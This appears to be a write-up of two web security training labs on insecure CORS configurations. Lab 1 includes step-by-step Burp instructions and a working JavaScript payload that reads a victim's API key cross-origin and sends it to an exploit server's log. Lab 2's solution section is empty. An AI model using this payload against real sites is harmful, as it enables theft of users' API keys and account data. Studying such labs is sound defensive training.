
# Lab 1

## Description

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`


## Solution

1. Check intercept is off, then use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header:
    
    `Origin: https://example.com`
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL:
    
    `<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>`
6. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click **Deliver exploit to victim**.
8. Click **Access log**, retrieve and submit the victim's API key to complete the lab.


# Lab 2

## Description

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

